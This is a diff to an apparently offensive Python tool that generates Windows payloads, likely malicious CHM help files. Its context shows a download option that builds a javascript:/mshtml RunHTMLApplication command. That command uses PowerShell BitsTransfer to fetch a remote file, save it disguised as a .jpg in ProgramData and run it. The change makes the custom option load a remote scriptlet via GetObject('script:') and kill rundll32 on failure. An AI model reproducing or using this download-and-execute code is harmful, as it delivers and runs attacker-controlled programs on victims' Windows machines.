@@ -752,7 +752,8 @@ if args.download is not None:
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe Import-Module BitsTransfer;Start-BitsTransfer '+ args.download +' C:\\\\ProgramData\\\\write.jpg;cmd.exe /c C:\\\\ProgramData\\\\write.jpg;cmd /c taskkill /f /im rundll32.exe",0,true);'
 
 if args.custom is not None:
-  command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("' + args.custom + '");'
+  # command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:' + args.custom + '");'
+    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();try{GetObject("script:' + args.custom + '");}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
 
 if command == ' ':
     parser.print_help()
@@ -820,8 +821,6 @@ exp_hhc='''<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
 </BODY>
 </HTML>
 '''.format(args.index1, args.index2)
-
-
 
 # print exp_htm, exp_hhc, exp_hhk, exp_hhp
 # print php_htm
